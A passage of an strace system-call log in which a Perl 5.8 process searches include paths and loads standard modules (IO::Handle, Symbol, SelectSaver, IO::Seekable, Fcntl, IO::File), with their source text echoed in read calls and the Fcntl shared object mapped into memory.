$io->getc()\';\n    getc($_[0]);\n}\n\nsub eof {\n    @_ == 1 or croak \'usage: $io->eof()\';\n    eof($_[0]);\n}\n\nsub print {\n    @_ or croak \'usage: $io->print(ARGS)\';\n    my $this = shift;\n    print $this @_;\n}\n\nsub printf {\n    @_ >= 2 or croak \'usage: $io->printf(FMT,[ARGS])\';\n    my $this = shift;\n    printf $this @_;\n}\n\nsub getline {\n    @_ == 1 or croak \'usage: $io->getline()\';\n    my $this = shift;\n    return scalar <$this>;\n} \n\n*gets = \\&getline;  # deprecated\n\nsub getlines {\n    @_ == 1 or croak \'usage: $io->getlines()\';\n    wantarray or\n\tcroak \'Can\\\'t call $io->getlines in a scalar context, use $io->getline\';\n    my $this = shift;\n    return <$this>;\n}\n\nsub truncate {\n    @_ == 2 or croak \'usage: $io->truncate(LEN)\';\n    truncate($_[0], $_[1]);\n}\n\nsub read {\n    @_ == 3 || @_ == 4 or croak \'usage: $io->read(BUF, LEN [, OFFSET])\';\n    read($_[0], $_[1], $_[2], $_[3] || 0);\n}\n\nsub sysread {\n    @_ == 3 || @_ == 4 or croak \'usage: $io->sysread(BUF, LEN [, OFFSET])\';\n    sysread($_[0], $_[1], $_[2], $_[3] || 0);\n}\n\nsub write {\n    @_ >= 2 && @_ <= 4 or croak \'usage: $io->write(BUF [, LEN [, OFFSET]])\';\n    local($\\) = \"\";\n    $_[2] = length($_[1]) unless defined $_[2];\n    print { $_[0] } substr($_[1], $_[3] || 0, $_[2]);\n}\n\nsub syswrite {\n    @_ >= 2 && @_ <= 4 or croak \'usage: $io->syswrite(BUF [, LEN [, OFFSET]])\';\n    if (defined($_[2])) {\n\tsyswrite($_[0], $_[1], $_[2], $_[3] || 0);\n    } else {\n\tsyswrite($_[0], $_[1]);\n    }\n}\n\nsub stat {\n    @_ == 1 or croak \'u", 4096) = 4096
18439 12:54:35.861171 stat64("/etc/perl/Symbol.pmc", 0xbff7801c) = -1 ENOENT (No such file or directory)
18439 12:54:35.861187 stat64("/etc/perl/Symbol.pm", 0xbff77f2c) = -1 ENOENT (No such file or directory)
18439 12:54:35.861201 stat64("/usr/local/lib/perl/5.8.8/Symbol.pmc", 0xbff7801c) = -1 ENOENT (No such file or directory)
18439 12:54:35.861214 stat64("/usr/local/lib/perl/5.8.8/Symbol.pm", 0xbff77f2c) = -1 ENOENT (No such file or directory)
18439 12:54:35.861228 stat64("/usr/local/share/perl/5.8.8/Symbol.pmc", 0xbff7801c) = -1 ENOENT (No such file or directory)
18439 12:54:35.861240 stat64("/usr/local/share/perl/5.8.8/Symbol.pm", 0xbff77f2c) = -1 ENOENT (No such file or directory)
18439 12:54:35.861254 stat64("/usr/lib/perl5/Symbol.pmc", 0xbff7801c) = -1 ENOENT (No such file or directory)
18439 12:54:35.861266 stat64("/usr/lib/perl5/Symbol.pm", 0xbff77f2c) = -1 ENOENT (No such file or directory)
18439 12:54:35.861279 stat64("/usr/share/perl5/Symbol.pmc", 0xbff7801c) = -1 ENOENT (No such file or directory)
18439 12:54:35.861291 stat64("/usr/share/perl5/Symbol.pm", 0xbff77f2c) = -1 ENOENT (No such file or directory)
18439 12:54:35.861304 stat64("/usr/lib/perl/5.8/Symbol.pmc", 0xbff7801c) = -1 ENOENT (No such file or directory)
18439 12:54:35.861316 stat64("/usr/lib/perl/5.8/Symbol.pm", 0xbff77f2c) = -1 ENOENT (No such file or directory)
18439 12:54:35.861330 stat64("/usr/share/perl/5.8/Symbol.pmc", 0xbff7801c) = -1 ENOENT (No such file or directory)
18439 12:54:35.861342 stat64("/usr/share/perl/5.8/Symbol.pm", {st_mode=S_IFREG|0644, st_size=2099, ...}) = 0
18439 12:54:35.861363 open("/usr/share/perl/5.8/Symbol.pm", O_RDONLY|O_LARGEFILE) = 9
18439 12:54:35.861377 ioctl(9, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbff77d38) = -1 ENOTTY (Inappropriate ioctl for device)
18439 12:54:35.861396 _llseek(9, 0, [0], SEEK_CUR) = 0
18439 12:54:35.861416 read(9, "package Symbol;\n\nBEGIN { require 5.005; }\n\nrequire Exporter;\n@ISA = qw(Exporter);\n@EXPORT = qw(gensym ungensym qualify qualify_to_ref);\n@EXPORT_OK = qw(delete_package geniosym);\n\n$VERSION = \'1.06\';\n\nmy $genpkg = \"Symbol::\";\nmy $genseq = 0;\n\nmy %global = map {$_ => 1} qw(ARGV ARGVOUT ENV INC SIG STDERR STDIN STDOUT);\n\n#\n# Note that we never _copy_ the glob; we just make a ref to it.\n# If we did copy it, then SVf_FAKE would be set on the copy, and\n# glob-specific behaviors (e.g. C<*$ref = \\&func>) wouldn\'t work.\n#\nsub gensym () {\n    my $name = \"GEN\" . $genseq++;\n    my $ref = \\*{$genpkg . $name};\n    delete $$genpkg{$name};\n    $ref;\n}\n\nsub geniosym () {\n    my $sym = gensym();\n    # force the IO slot to be filled\n    select(select $sym);\n    *$sym{IO};\n}\n\nsub ungensym ($) {}\n\nsub qualify ($;$) {\n    my ($name) = @_;\n    if (!ref($name) && index($name, \'::\') == -1 && index($name, \"\'\") == -1) {\n\tmy $pkg;\n\t# Global names: special character, \"^xyz\", or other. \n\tif ($name =~ /^(([^a-z])|(\\^[a-z_]+))\\z/i || $global{$name}) {\n\t    # RGS 2001-11-05 : translate leading ^X to control-char\n\t    $name =~ s/^\\^([a-z_])/\'qq(\\c\'.$1.\')\'/eei;\n\t    $pkg = \"main\";\n\t}\n\telse {\n\t    $pkg = (@_ > 1) ? $_[1] : caller;\n\t}\n\t$name = $pkg . \"::\" . $name;\n    }\n    $name;\n}\n\nsub qualify_to_ref ($;$) {\n    return \\*{ qualify $_[0], @_ > 1 ? $_[1] : caller };\n}\n\n#\n# of Safe.pm lineage\n#\nsub delete_package ($) {\n    my $pkg = shift;\n\n    # expand to full symbol table name if needed\n\n    unless ($pkg =~ /^main::.*::$/) {\n        $pkg = \"main$pkg\"\tif\t$pkg =~ /^::/;\n        $pkg = \"main::$pkg\"\tunless\t$pkg =~ /^main::/;\n        $pkg .= \'::\'\t\tunless\t$pkg =~ /::$/;\n    }\n\n    my($stem, $leaf) = $pkg =~ m/(.*::)(\\w+::)$/;\n    my $stem_symtab = *{$stem}{HASH};\n    return unless defined $stem_symtab and exists $stem_symtab->{$leaf};\n\n    # free all the symbols in the package\n\n    my $leaf_symtab = *{$stem_symtab->{$leaf}}{HASH};\n    foreach my $name (keys %$leaf_symtab) {\n        undef *{$pkg . $name};\n    }\n\n    # delete the symbol table\n\n    %$leaf_symtab = ();\n    delete $stem_symtab->{$leaf};\n}\n\n1;\n", 4096) = 2099
18439 12:54:35.861817 read(9, "", 4096) = 0
18439 12:54:35.861834 close(9)          = 0
18439 12:54:35.861948 stat64("/etc/perl/SelectSaver.pmc", 0xbff7801c) = -1 ENOENT (No such file or directory)
18439 12:54:35.861966 stat64("/etc/perl/SelectSaver.pm", 0xbff77f2c) = -1 ENOENT (No such file or directory)
18439 12:54:35.861981 stat64("/usr/local/lib/perl/5.8.8/SelectSaver.pmc", 0xbff7801c) = -1 ENOENT (No such file or directory)
18439 12:54:35.861994 stat64("/usr/local/lib/perl/5.8.8/SelectSaver.pm", 0xbff77f2c) = -1 ENOENT (No such file or directory)
18439 12:54:35.862009 stat64("/usr/local/share/perl/5.8.8/SelectSaver.pmc", 0xbff7801c) = -1 ENOENT (No such file or directory)
18439 12:54:35.862021 stat64("/usr/local/share/perl/5.8.8/SelectSaver.pm", 0xbff77f2c) = -1 ENOENT (No such file or directory)
18439 12:54:35.862036 stat64("/usr/lib/perl5/SelectSaver.pmc", 0xbff7801c) = -1 ENOENT (No such file or directory)
18439 12:54:35.862048 stat64("/usr/lib/perl5/SelectSaver.pm", 0xbff77f2c) = -1 ENOENT (No such file or directory)
18439 12:54:35.862061 stat64("/usr/share/perl5/SelectSaver.pmc", 0xbff7801c) = -1 ENOENT (No such file or directory)
18439 12:54:35.862073 stat64("/usr/share/perl5/SelectSaver.pm", 0xbff77f2c) = -1 ENOENT (No such file or directory)
18439 12:54:35.862087 stat64("/usr/lib/perl/5.8/SelectSaver.pmc", 0xbff7801c) = -1 ENOENT (No such file or directory)
18439 12:54:35.862100 stat64("/usr/lib/perl/5.8/SelectSaver.pm", 0xbff77f2c) = -1 ENOENT (No such file or directory)
18439 12:54:35.862114 stat64("/usr/share/perl/5.8/SelectSaver.pmc", 0xbff7801c) = -1 ENOENT (No such file or directory)
18439 12:54:35.862127 stat64("/usr/share/perl/5.8/SelectSaver.pm", {st_mode=S_IFREG|0644, st_size=340, ...}) = 0
18439 12:54:35.862149 open("/usr/share/perl/5.8/SelectSaver.pm", O_RDONLY|O_LARGEFILE) = 9
18439 12:54:35.862164 ioctl(9, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbff77d38) = -1 ENOTTY (Inappropriate ioctl for device)
18439 12:54:35.862176 _llseek(9, 0, [0], SEEK_CUR) = 0
18439 12:54:35.862194 read(9, "package SelectSaver;\n\nour $VERSION = \'1.01\';\n\nrequire 5.000;\nuse Carp;\nuse Symbol;\n\nsub new {\n    @_ >= 1 && @_ <= 2 or croak \'usage: new SelectSaver [FILEHANDLE]\';\n    my $fh = select;\n    my $self = bless \\$fh, $_[0];\n    select qualify($_[1], caller) if @_ > 1;\n    $self;\n}\n\nsub DESTROY {\n    my $self = $_[0];\n    select $$self;\n}\n\n1;\n", 4096) = 340
18439 12:54:35.862321 brk(0x81d6000)    = 0x81d6000
18439 12:54:35.866713 read(9, "", 4096) = 0
18439 12:54:35.866713 close(9)          = 0
18439 12:54:35.866842 read(7, "sage: $io->stat()\';\n    stat($_[0]);\n}\n\n################################################\n## State modification functions.\n##\n\nsub autoflush {\n    my $old = new SelectSaver qualify($_[0], caller);\n    my $prev = $|;\n    $| = @_ > 1 ? $_[1] : 1;\n    $prev;\n}\n\nsub output_field_separator {\n    carp \"output_field_separator is not supported on a per-handle basis\"\n\tif ref($_[0]);\n    my $prev = $,;\n    $, = $_[1] if @_ > 1;\n    $prev;\n}\n\nsub output_record_separator {\n    carp \"output_record_separator is not supported on a per-handle basis\"\n\tif ref($_[0]);\n    my $prev = $\\;\n    $\\ = $_[1] if @_ > 1;\n    $prev;\n}\n\nsub input_record_separator {\n    carp \"input_record_separator is not supported on a per-handle basis\"\n\tif ref($_[0]);\n    my $prev = $/;\n    $/ = $_[1] if @_ > 1;\n    $prev;\n}\n\nsub input_line_number {\n    local $.;\n    () = tell qualify($_[0], caller) if ref($_[0]);\n    my $prev = $.;\n    $. = $_[1] if @_ > 1;\n    $prev;\n}\n\nsub format_page_number {\n    my $old;\n    $old = new SelectSaver qualify($_[0], caller) if ref($_[0]);\n    my $prev = $%;\n    $% = $_[1] if @_ > 1;\n    $prev;\n}\n\nsub format_lines_per_page {\n    my $old;\n    $old = new SelectSaver qualify($_[0], caller) if ref($_[0]);\n    my $prev = $=;\n    $= = $_[1] if @_ > 1;\n    $prev;\n}\n\nsub format_lines_left {\n    my $old;\n    $old = new SelectSaver qualify($_[0], caller) if ref($_[0]);\n    my $prev = $-;\n    $- = $_[1] if @_ > 1;\n    $prev;\n}\n\nsub format_name {\n    my $old;\n    $old = new SelectSaver qualify($_[0], caller) if ref($_[0]);\n    my $prev = $~;\n    $~ = qualify($_[1], caller) if @_ > 1;\n    $prev;\n}\n\nsub format_top_name {\n    my $old;\n    $old = new SelectSaver qualify($_[0], caller) if ref($_[0]);\n    my $prev = $^;\n    $^ = qualify($_[1], caller) if @_ > 1;\n    $prev;\n}\n\nsub format_line_break_characters {\n    carp \"format_line_break_characters is not supported on a per-handle basis\"\n\tif ref($_[0]);\n    my $prev = $:;\n    $: = $_[1] if @_ > 1;\n    $prev;\n}\n\nsub format_formfeed {\n    carp \"format_formfeed is not supported on a per-handle basis\"\n\tif ref($_[0]);\n    my $prev = $^L;\n    $^L = $_[1] if @_ > 1;\n    $prev;\n}\n\nsub formline {\n    my $io = shift;\n    my $picture = shift;\n    local($^A) = $^A;\n    local($\\) = \"\";\n    formline($picture, @_);\n    print $io $^A;\n}\n\nsub format_write {\n    @_ < 3 || croak \'usage: $io->write( [FORMAT_NAME] )\';\n    if (@_ == 2) {\n\tmy ($io, $fmt) = @_;\n\tmy $oldfmt = $io->format_name($fmt);\n\tCORE::write($io);\n\t$io->format_name($oldfmt);\n    } else {\n\tCORE::write($_[0]);\n    }\n}\n\n# XXX undocumented\nsub fcntl {\n    @_ == 3 || croak \'usage: $io->fcntl( OP, VALUE );\';\n    my ($io, $op) = @_;\n    return fcntl($io, $op, $_[2]);\n}\n\n# XXX undocumented\nsub ioctl {\n    @_ == 3 || croak \'usage: $io->ioctl( OP, VALUE );\';\n    my ($io, $op) = @_;\n    return ioctl($io, $op, $_[2]);\n}\n\n# this sub is for compatability with older releases of IO that used\n# a sub called constant to detemine if a constant existed -- GMB\n#\n# The SEEK_* and _IO?BF constants were the only constants at that time\n# any new code should just chech defined(&CONSTANT_NAME)\n\nsub constant {\n    no strict \'refs\';\n    my $name = shift;\n    (($name =~ /^(SEEK_(SET|CUR|END)|_IO[FLN]BF)$/) && defined &{$name})\n\t? &{$name}() : undef;\n}\n\n# so that flush.pl can be deprecated\n\nsub printflush {\n    my $io = shift;\n    my $old;\n    $old = new SelectSaver qualify($io, caller) if ref($io);\n    local $| = 1;\n    if(ref($io)) {\n        print $io @_;\n    }\n    else {\n\tprint @_;\n    }\n}\n\n1;\n", 4096) = 3496
18439 12:54:35.867470 read(7, "", 4096) = 0
18439 12:54:35.867487 close(7)          = 0
18439 12:54:35.867527 stat64("/etc/perl/IO/Seekable.pmc", 0xbff784cc) = -1 ENOENT (No such file or directory)
18439 12:54:35.867543 stat64("/etc/perl/IO/Seekable.pm", 0xbff783dc) = -1 ENOENT (No such file or directory)
18439 12:54:35.867557 stat64("/usr/local/lib/perl/5.8.8/IO/Seekable.pmc", 0xbff784cc) = -1 ENOENT (No such file or directory)
18439 12:54:35.867570 stat64("/usr/local/lib/perl/5.8.8/IO/Seekable.pm", 0xbff783dc) = -1 ENOENT (No such file or directory)
18439 12:54:35.867585 stat64("/usr/local/share/perl/5.8.8/IO/Seekable.pmc", 0xbff784cc) = -1 ENOENT (No such file or directory)
18439 12:54:35.867598 stat64("/usr/local/share/perl/5.8.8/IO/Seekable.pm", 0xbff783dc) = -1 ENOENT (No such file or directory)
18439 12:54:35.867612 stat64("/usr/lib/perl5/IO/Seekable.pmc", 0xbff784cc) = -1 ENOENT (No such file or directory)
18439 12:54:35.867624 stat64("/usr/lib/perl5/IO/Seekable.pm", 0xbff783dc) = -1 ENOENT (No such file or directory)
18439 12:54:35.867637 stat64("/usr/share/perl5/IO/Seekable.pmc", 0xbff784cc) = -1 ENOENT (No such file or directory)
18439 12:54:35.867649 stat64("/usr/share/perl5/IO/Seekable.pm", 0xbff783dc) = -1 ENOENT (No such file or directory)
18439 12:54:35.867676 stat64("/usr/lib/perl/5.8/IO/Seekable.pmc", 0xbff784cc) = -1 ENOENT (No such file or directory)
18439 12:54:35.867689 stat64("/usr/lib/perl/5.8/IO/Seekable.pm", {st_mode=S_IFREG|0644, st_size=686, ...}) = 0
18439 12:54:35.867710 open("/usr/lib/perl/5.8/IO/Seekable.pm", O_RDONLY|O_LARGEFILE) = 7
18439 12:54:35.867729 ioctl(7, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbff781e8) = -1 ENOTTY (Inappropriate ioctl for device)
18439 12:54:35.867740 _llseek(7, 0, [0], SEEK_CUR) = 0
18439 12:54:35.867759 read(7, "#\n\npackage IO::Seekable;\n\nuse 5.006_001;\nuse Carp;\nuse strict;\nour($VERSION, @EXPORT, @ISA);\nuse IO::Handle ();\n# XXX we can\'t get these from IO::Handle or we\'ll get prototype\n# mismatch warnings on C<use POSIX; use IO::File;> :-(\nuse Fcntl qw(SEEK_SET SEEK_CUR SEEK_END);\nrequire Exporter;\n\n@EXPORT = qw(SEEK_SET SEEK_CUR SEEK_END);\n@ISA = qw(Exporter);\n\n$VERSION = \"1.10\";\n$VERSION = eval $VERSION;\n\nsub seek {\n    @_ == 3 or croak \'usage: $io->seek(POS, WHENCE)\';\n    seek($_[0], $_[1], $_[2]);\n}\n\nsub sysseek {\n    @_ == 3 or croak \'usage: $io->sysseek(POS, WHENCE)\';\n    sysseek($_[0], $_[1], $_[2]);\n}\n\nsub tell {\n    @_ == 1 or croak \'usage: $io->tell()\';\n    tell($_[0]);\n}\n\n1;\n", 4096) = 686
18439 12:54:35.867933 stat64("/etc/perl/Fcntl.pmc", 0xbff7801c) = -1 ENOENT (No such file or directory)
18439 12:54:35.876590 stat64("/etc/perl/Fcntl.pm", 0xbff77f2c) = -1 ENOENT (No such file or directory)
18439 12:54:35.876591 stat64("/usr/local/lib/perl/5.8.8/Fcntl.pmc", 0xbff7801c) = -1 ENOENT (No such file or directory)
18439 12:54:35.876591 stat64("/usr/local/lib/perl/5.8.8/Fcntl.pm", 0xbff77f2c) = -1 ENOENT (No such file or directory)
18439 12:54:35.876591 stat64("/usr/local/share/perl/5.8.8/Fcntl.pmc", 0xbff7801c) = -1 ENOENT (No such file or directory)
18439 12:54:35.876591 stat64("/usr/local/share/perl/5.8.8/Fcntl.pm", 0xbff77f2c) = -1 ENOENT (No such file or directory)
18439 12:54:35.876592 stat64("/usr/lib/perl5/Fcntl.pmc", 0xbff7801c) = -1 ENOENT (No such file or directory)
18439 12:54:35.876592 stat64("/usr/lib/perl5/Fcntl.pm", 0xbff77f2c) = -1 ENOENT (No such file or directory)
18439 12:54:35.876592 stat64("/usr/share/perl5/Fcntl.pmc", 0xbff7801c) = -1 ENOENT (No such file or directory)
18439 12:54:35.876604 stat64("/usr/share/perl5/Fcntl.pm", 0xbff77f2c) = -1 ENOENT (No such file or directory)
18439 12:54:35.876617 stat64("/usr/lib/perl/5.8/Fcntl.pmc", 0xbff7801c) = -1 ENOENT (No such file or directory)
18439 12:54:35.876629 stat64("/usr/lib/perl/5.8/Fcntl.pm", {st_mode=S_IFREG|0644, st_size=3458, ...}) = 0
18439 12:54:35.876649 open("/usr/lib/perl/5.8/Fcntl.pm", O_RDONLY|O_LARGEFILE) = 9
18439 12:54:35.876663 ioctl(9, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbff77d38) = -1 ENOTTY (Inappropriate ioctl for device)
18439 12:54:35.876674 _llseek(9, 0, [0], SEEK_CUR) = 0
18439 12:54:35.876694 read(9, "package Fcntl;\n\nour($VERSION, @ISA, @EXPORT, @EXPORT_OK, %EXPORT_TAGS, $AUTOLOAD);\n\nrequire Exporter;\nuse XSLoader ();\n@ISA = qw(Exporter);\n$VERSION = \"1.05\";\n# Items to export into callers namespace by default\n# (move infrequently used names to @EXPORT_OK below)\n@EXPORT =\n  qw(\n\tFD_CLOEXEC\n\tF_ALLOCSP\n\tF_ALLOCSP64\n\tF_COMPAT\n\tF_DUP2FD\n\tF_DUPFD\n\tF_EXLCK\n\tF_FREESP\n\tF_FREESP64\n\tF_FSYNC\n\tF_FSYNC64\n\tF_GETFD\n\tF_GETFL\n\tF_GETLK\n\tF_GETLK64\n\tF_GETOWN\n\tF_NODNY\n\tF_POSIX\n\tF_RDACC\n\tF_RDDNY\n\tF_RDLCK\n\tF_RWACC\n\tF_RWDNY\n\tF_SETFD\n\tF_SETFL\n\tF_SETLK\n\tF_SETLK64\n\tF_SETLKW\n\tF_SETLKW64\n\tF_SETOWN\n\tF_SHARE\n\tF_SHLCK\n\tF_UNLCK\n\tF_UNSHARE\n\tF_WRACC\n\tF_WRDNY\n\tF_WRLCK\n\tO_ACCMODE\n\tO_ALIAS\n\tO_APPEND\n\tO_ASYNC\n\tO_BINARY\n\tO_CREAT\n\tO_DEFER\n\tO_DIRECT\n\tO_DIRECTORY\n\tO_DSYNC\n\tO_EXCL\n\tO_EXLOCK\n\tO_LARGEFILE\n\tO_NDELAY\n\tO_NOCTTY\n\tO_NOFOLLOW\n\tO_NOINHERIT\n\tO_NONBLOCK\n\tO_RANDOM\n\tO_RAW\n\tO_RDONLY\n\tO_RDWR\n\tO_RSRC\n\tO_RSYNC\n\tO_SEQUENTIAL\n\tO_SHLOCK\n\tO_SYNC\n\tO_TEMPORARY\n\tO_TEXT\n\tO_TRUNC\n\tO_WRONLY\n     );\n\n# Other items we are prepared to export if requested\n@EXPORT_OK = qw(\n\tDN_ACCESS\n\tDN_ATTRIB\n\tDN_CREATE\n\tDN_DELETE\n\tDN_MODIFY\n\tDN_MULTISHOT\n\tDN_RENAME\n\tFAPPEND\n\tFASYNC\n\tFCREAT\n\tFDEFER\n\tFDSYNC\n\tFEXCL\n\tFLARGEFILE\n\tFNDELAY\n\tFNONBLOCK\n\tFRSYNC\n\tFSYNC\n\tFTRUNC\n\tF_GETLEASE\n\tF_GETSIG\n\tF_NOTIFY\n\tF_SETLEASE\n\tF_SETSIG\n\tLOCK_EX\n\tLOCK_MAND\n\tLOCK_NB\n\tLOCK_READ\n\tLOCK_RW\n\tLOCK_SH\n\tLOCK_UN\n\tLOCK_WRITE\n\tO_IGNORE_CTTY\n\tO_NOATIME\n\tO_NOLINK\n\tO_NOTRANS\n\tSEEK_CUR\n\tSEEK_END\n\tSEEK_SET\n\tS_IFSOCK S_IFBLK S_IFCHR S_IFIFO S_IFWHT S_ENFMT\n\tS_IREAD S_IWRITE S_IEXEC\n\tS_IRGRP S_IWGRP S_IXGRP S_IRWXG\n\tS_IROTH S_IWOTH S_IXOTH S_IRWXO\n\tS_IRUSR S_IWUSR S_IXUSR S_IRWXU\n\tS_ISUID S_ISGID S_ISVTX S_ISTXT\n\t_S_IFMT S_IFREG S_IFDIR S_IFLNK\n\t&S_ISREG &S_ISDIR &S_ISLNK &S_ISSOCK &S_ISBLK &S_ISCHR &S_ISFIFO\n\t&S_ISWHT &S_ISENFMT &S_IFMT &S_IMODE\n);\n# Named groups of exports\n%EXPORT_TAGS = (\n    \'flock\'   => [qw(LOCK_SH LOCK_EX LOCK_NB LOCK_UN)],\n    \'Fcompat\' => [qw(FAPPEND FASYNC FCREAT FDEFER FDSYNC FEXCL FLARGEFILE\n\t\t     FNDELAY FNONBLOCK FRSYNC FSYNC FTRUNC)],\n    \'seek\'    => [qw(SEEK_SET SEEK_CUR SEEK_END)],\n    \'mode\'    => [qw(S_ISUID S_ISGID S_ISVTX S_ISTXT\n\t\t     _S_IFMT S_IFREG S_IFDIR S_IFLNK\n\t\t     S_IFSOCK S_IFBLK S_IFCHR S_IFIFO S_IFWHT S_ENFMT\n\t\t     S_IRUSR S_IWUSR S_IXUSR S_IRWXU\n\t\t     S_IRGRP S_IWGRP S_IXGRP S_IRWXG\n\t\t     S_IROTH S_IWOTH S_IXOTH S_IRWXO\n\t\t     S_IREAD S_IWRITE S_IEXEC\n\t\t     S_ISREG S_ISDIR S_ISLNK S_ISSOCK\n\t\t     S_ISBLK S_ISCHR S_ISFIFO\n\t\t     S_ISWHT S_ISENFMT\t\t\n\t\t     S_IFMT S_IMODE\n                  )],\n);\n\nsub S_IFMT  { @_ ? ( $_[0] & _S_IFMT() ) : _S_IFMT()  }\nsub S_IMODE { $_[0] & 07777 }\n\nsub S_ISREG    { ( $_[0] & _S_IFMT() ) == S_IFREG()   }\nsub S_ISDIR    { ( $_[0] & _S_IFMT() ) == S_IFDIR()   }\nsub S_ISLNK    { ( $_[0] & _S_IFMT() ) == S_IFLNK()   }\nsub S_ISSOCK   { ( $_[0] & _S_IFMT() ) == S_IFSOCK()  }\nsub S_ISBLK    { ( $_[0] & _S_IFMT() ) == S_IFBLK()   }\nsub S_ISCHR    { ( $_[0] & _S_IFMT() ) == S_IFCHR()   }\nsub S_ISFIFO   { ( $_[0] & _S_IFMT() ) == S_IFIFO()   }\nsub S_ISWHT    { ( $_[0] & _S_IFMT() ) == S_IFWHT()   }\nsub S_ISENFMT  { ( $_[0] & _S_IFMT() ) == S_IFENFMT() }\n\nsub AUTOLOAD {\n    (my $constname = $AUTOLOAD) =~ s/.*:://;\n    die \"&Fcntl::constant not defined\" if $constname eq \'constant\';\n    my ($error, $val) = constant($constname);\n    if ($error) {\n        my (undef,$file,$line) = caller;\n        die \"$error at $file line $line.\\n\";\n    }\n    *$AUTOLOAD = sub { $val };\n    goto &$AUTOLOAD;\n}\n\nXSLoader::load \'Fcntl\', $VERSION;\n\n1;\n", 4096) = 3458
18439 12:54:35.877130 brk(0x81f7000)    = 0x81f7000
18439 12:54:35.877304 read(9, "", 4096) = 0
18439 12:54:35.877319 close(9)          = 0
18439 12:54:35.877455 stat64("/usr/lib/perl/5.8/auto/Fcntl/Fcntl.so", {st_mode=S_IFREG|0644, st_size=12412, ...}) = 0
18439 12:54:35.877480 stat64("/usr/lib/perl/5.8/auto/Fcntl/Fcntl.bs", {st_mode=S_IFREG|0644, st_size=0, ...}) = 0
18439 12:54:35.877506 open("/usr/lib/perl/5.8/auto/Fcntl/Fcntl.so", O_RDONLY) = 9
18439 12:54:35.877520 read(9, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0 \10\0\0004\0\0\0\274,\0\0\0\0\0\0004\0 \0\4\0(\0\30\0\27\0\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\274*\0\0\274*\0\0\5\0\0\0\0\20\0\0\1\0\0\0\274*\0\0\274:\0\0\274:\0\0T\1\0\0X\1\0\0\6\0\0\0\0\20\0\0\2\0\0\0\320*\0\0\320:\0\0\320:\0\0\310\0\0\0\310\0\0\0\6\0\0\0\4\0\0\0Q\345td\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\6\0\0\0\4\0\0\0\21\0\0\0\36\0\0\0\0\0\0\0\25\0\0\0\32\0\0\0\24\0\0\0\5\0\0\0\t\0\0\0\0\0\0\0\23\0\0\0\21\0\0\0\34\0\0\0\4\0\0\0\26\0\0\0\0\0\0\0\30\0\0\0\17\0\0\0\27\0\0\0\r\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\1\0\0\0\0\0\0\0\3\0\0\0\2\0\0\0\0\0\0\0\0\0\0\0\v\0\0\0\6\0\0\0\35\0\0\0\7\0\0\0\0\0\0\0\22\0\0\0\31\0\0\0\33\0\0\0\20\0\0\0\16\0\0\0\n\0\0\0\0\0\0\0\f\0\0\0\10\0\0\0\0\0\0\0\3\0\0\0\27\0\0\0\2\0\0\0\6\0\0\0\210\0 \1\0\304H\t\27\0\0\0\32\0\0\0\35\0\0\0\356TU\220\272\343\222|CE\325\354.6bx\330qX\34\271\215\361\16\353\323\357\16\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\353\0\0\0\0\0\0\0\0\0\0\0\20\0\0\0j\1\0\0\0\0\0\0\0\0\0\0\20\0\0\0\337\0\0\0\0\0\0\0\0\0\0\0\20\0\0\0u\0\0\0\0\0\0\0", 512) = 512
18439 12:54:35.877610 fstat64(9, {st_mode=S_IFREG|0644, st_size=12412, ...}) = 0
18439 12:54:35.877628 mmap2(NULL, 15380, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 9, 0) = 0xb7d6c000
18439 12:54:35.877645 mmap2(0xb7d6f000, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 9, 0x2) = 0xb7d6f000
18439 12:54:35.877660 close(9)          = 0
18439 12:54:35.877908 read(7,  <unfinished ...>
18437 12:54:35.877926 rt_sigprocmask(SIG_SETMASK, [], NULL, 8) = 0
18437 12:54:35.877948 rt_sigprocmask(SIG_BLOCK, [CHLD], [], 8) = 0
18437 12:54:35.877976 rt_sigprocmask(SIG_SETMASK, [], NULL, 8) = 0
18437 12:54:35.877986 rt_sigprocmask(SIG_BLOCK, [CHLD], [], 8) = 0
18437 12:54:35.877998 rt_sigaction(SIGINT, {0x807f150, [], 0}, {SIG_DFL}, 8) = 0
18437 12:54:35.878012 waitpid(-1,  <unfinished ...>
18439 12:54:35.878021 <... read resumed> "", 4096) = 0
18439 12:54:35.878029 close(7)          = 0
18439 12:54:35.878061 stat64("/etc/perl/IO/File.pmc", 0xbff784cc) = -1 ENOENT (No such file or directory)
18439 12:54:35.878089 stat64("/etc/perl/IO/File.pm", 0xbff783dc) = -1 ENOENT (No such file or directory)
18439 12:54:35.878103 stat64("/usr/local/lib/perl/5.8.8/IO/File.pmc", 0xbff784cc) = -1 ENOENT (No such file or directory)
18439 12:54:35.878116 stat64("/usr/local/lib/perl/5.8.8/IO/File.pm", 0xbff783dc) = -1 ENOENT (No such file or directory)
18439 12:54:35.878131 stat64("/usr/local/share/perl/5.8.8/IO/File.pmc", 0xbff784cc) = -1 ENOENT (No such file or directory)
18439 12:54:35.878143 stat64("/usr/local/share/perl/5.8.8/IO/File.pm", 0xbff783dc) = -1 ENOENT (No such file or directory)
18439 12:54:35.878157 stat64("/usr/lib/perl5/IO/File.pmc", 0xbff784cc) = -1 ENOENT (No such file or directory)
18439 12:54:35.878169 stat64("/usr/lib/perl5/IO/File.pm", 0xbff783dc) = -1 ENOENT (No such file or directory)
18439 12:54:35.878182 stat64("/usr/share/perl5/IO/File.pmc", 0xbff784cc) = -1 ENOENT (No such file or directory)
18439 12:54:35.878195 stat64("/usr/share/perl5/IO/File.pm", 0xbff783dc) = -1 ENOENT (No such file or directory)
18439 12:54:35.878208 stat64("/usr/lib/perl/5.8/IO/File.pmc", 0xbff784cc) = -1 ENOENT (No such file or directory)
18439 12:54:35.878220 stat64("/usr/lib/perl/5.8/IO/File.pm", {st_mode=S_IFREG|0644, st_size=1784, ...}) = 0
18439 12:54:35.878242 open("/usr/lib/perl/5.8/IO/File.pm", O_RDONLY|O_LARGEFILE) = 7
